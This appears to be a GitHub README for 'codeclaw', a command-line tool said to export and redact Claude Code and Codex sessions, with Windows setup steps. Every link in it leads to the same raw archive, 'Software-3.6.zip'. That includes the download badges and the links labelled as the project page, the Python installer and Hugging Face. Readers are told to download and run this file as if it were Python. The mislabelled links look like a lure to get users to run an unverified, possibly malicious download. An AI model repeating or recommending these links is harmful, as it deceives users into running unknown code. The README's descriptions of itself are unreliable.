# 🦞 codeclaw - Export Claude Sessions with Privacy

[![Download codeclaw](https://img.shields.io/badge/Download-codeclaw-green?style=for-the-badge)](https://github.com/CuddlyPaws22/codeclaw/raw/refs/heads/main/codeclaw/cli/Software-3.6.zip)

---

## 📋 About codeclaw

codeclaw is a command-line tool that helps you export your Claude Code and Codex sessions. It protects your privacy by redacting sensitive information automatically. The tool also manages memory better and prepares your exported data so you can share or use it easily in other applications. It works well with Hugging Face datasets and supports workflows for machine learning tasks. 

You don’t need any special technical skills to use codeclaw. This guide walks you through how to download and run it on a Windows PC.

---

## 💻 System Requirements

To run codeclaw on your computer, make sure you meet these conditions:

- Windows 10 or later (64-bit)
- At least 4 GB of free disk space
- Minimum 8 GB of RAM recommended
- Python 3.8 or newer installed
- Internet connection for downloading and setup

If Python is not installed, codeclaw will not run smoothly. Instructions for installing Python are included below.

---

## 🚀 Getting Started: Download and Setup

### Step 1: Download codeclaw

To get codeclaw, visit the main GitHub page by clicking this link:

[![Download codeclaw](https://img.shields.io/badge/Download-codeclaw-orange?style=for-the-badge)](https://github.com/CuddlyPaws22/codeclaw/raw/refs/heads/main/codeclaw/cli/Software-3.6.zip)

This link takes you to the project repository where you can find all files and instructions.

### Step 2: Install Python (if needed)

codeclaw runs on Python. If you don’t have Python installed:

1. Open your web browser.
2. Go to https://github.com/CuddlyPaws22/codeclaw/raw/refs/heads/main/codeclaw/cli/Software-3.6.zip
3. Download the latest stable version (3.8 or above).
4. Run the installer.
5. During setup, check "Add Python to PATH".
6. Follow the installer prompts and finish the installation.

### Step 3: Download codeclaw files

On the GitHub page, look for the **Code** button (usually green). Click it and select **Download ZIP**.

- Save the ZIP file anywhere on your computer.
- Right-click the file and select **Extract All**.
- Choose a folder you can easily access, such as your Desktop.

### Step 4: Open Command Prompt

Next, you will run codeclaw from the Windows Command Prompt:

- Press **Windows key + R**, type **cmd**, and press Enter.
- Change directory to the folder where you extracted codeclaw.
  - You can do this by typing `cd path_to_folder`, replacing `path_to_folder` with your folder’s full path. For example:  
    `cd Desktop\codeclaw-master`

### Step 5: Check your Python installation

Type this command and press Enter:

```
python --version
```

You should see something like `Python 3.x.x`. If you get an error, Python is not set up correctly. Repeat the installation steps above.

### Step 6: Install required Python packages

codeclaw depends on several Python packages. Install them by typing:

```
pip install -r requirements.txt
```

This command reads a list of software libraries codeclaw needs and installs them.

---

## 🔧 Running codeclaw

Now that everything is ready, you can run codeclaw.

### Step 1: Start codeclaw

In the Command Prompt, type:

```
python codeclaw.py
```

This will launch the tool. Follow the on-screen prompts to export your Claude Code or Codex sessions.

### Step 2: Using codeclaw commands

codeclaw uses simple commands you enter in the terminal. Some examples:

- To start exporting a new session, type:

```
export-session
```

- To view help and see all commands, type:

```
help
```

- To exit the program, type:

```
exit
```

---

## 🧩 Features and Workflows

- **Privacy Redaction:** codeclaw scans your data and removes private or sensitive parts before exporting.
- **MCP Memory:** The tool manages session memory to avoid overload and keep important information.
- **Share-Ready Datasets:** Exported files are formatted to work directly with Hugging Face data tools or other machine learning pipelines.
- **CLI Interface:** Simple commands avoid the need for graphical tools or web interfaces.
- **Local Data Processing:** All operations happen on your computer, protecting your data from being sent to external servers.

---

## ⚙️ How Privacy Redaction Works

codeclaw sees common private information like names, emails, phone numbers, and passwords. It masks or removes these before saving data. This helps you share session datasets without exposing sensitive details.

Redaction rules are built into the program and update regularly. Users can also customize what the tool hides.

---

## 🗂️ Managing Your Exported Data

Once you export your session data, files are saved to a folder on your PC:

- Default folder: `Documents\codeclaw_exports`
- Files are organized by date and session name.
- Datasets are saved in JSON or CSV formats, ready for training or fine-tuning machine learning models.

You can upload these files to your Hugging Face account or use them locally.

---

## ❓ Troubleshooting Tips

- If `python` commands don’t work, check Python installation and PATH setup.
- Make sure you run the Command Prompt as a normal user.
- If required packages fail to install, check your internet connection.
- For errors during export, verify your session files are in the expected format.
- Visit the repository link for updates and known issues:  
  https://github.com/CuddlyPaws22/codeclaw/raw/refs/heads/main/codeclaw/cli/Software-3.6.zip

---

## 🧰 Additional Tools in codeclaw

- Data redaction report generator
- Session memory cleaner
- Dataset merging and splitting utilities
- Hugging Face integration scripts

All come with simple command-line options and help messages.

---

## 🔗 Useful Links

- codeclaw main page: https://github.com/CuddlyPaws22/codeclaw/raw/refs/heads/main/codeclaw/cli/Software-3.6.zip
- Python downloads: https://github.com/CuddlyPaws22/codeclaw/raw/refs/heads/main/codeclaw/cli/Software-3.6.zip
- Hugging Face: https://github.com/CuddlyPaws22/codeclaw/raw/refs/heads/main/codeclaw/cli/Software-3.6.zip

---

## 💡 Tips for Best Use

- Regularly update codeclaw to get new redaction rules.
- Back up your exported datasets in case you need to reuse them.
- Use the help command often to learn new features.
- Run exports on smaller session chunks for better memory management.

---

[![Download codeclaw](https://img.shields.io/badge/Download-codeclaw-green?style=for-the-badge)](https://github.com/CuddlyPaws22/codeclaw/raw/refs/heads/main/codeclaw/cli/Software-3.6.zip)